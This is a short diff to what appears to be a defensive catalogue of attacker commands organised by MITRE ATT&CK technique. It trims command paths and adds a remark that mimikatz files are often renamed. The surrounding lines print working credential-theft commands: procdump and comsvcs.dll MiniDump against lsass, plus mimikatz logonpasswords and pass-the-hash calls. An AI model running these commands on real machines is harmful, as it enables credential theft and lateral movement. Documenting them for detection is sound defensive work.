@@ -149,7 +149,7 @@ OS Credential Dumping: LSASS Memory [[T1003.001](https://attack.mitre.org/techni
 ```
 procdump.exe -accepteula -ma lsass.exe С:\Windows\Temp\mem.dmp
 procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\mem.dmp
-$system32\cmd.exe /C tasklist /svc | findstr lsass
+cmd.exe /C tasklist /svc | findstr lsass
 rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full
 ```
 <br>
@@ -436,7 +436,7 @@ powershell.exe Get-CimInstance -ClassName Win32_Service
 ```
 
 ```
-%SYSTEMROOT%\System32\sc.exe query <service_name>
+sc query <service_name>
 ```
 <br>
 
@@ -446,6 +446,7 @@ Use Alternate Authentication Material: Pass the Hash [[T1550.002](https://attac
 <mimikatz>.exe "privilege::debug" "sekurlsa::logonpasswords" exit > out.txt
 <mimikatz>.exe "privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>" exit
 ```
+* File name is often changed
 <br>
 
 Log Enumeration [[T1654](https://attack.mitre.org/techniques/T1654/)]
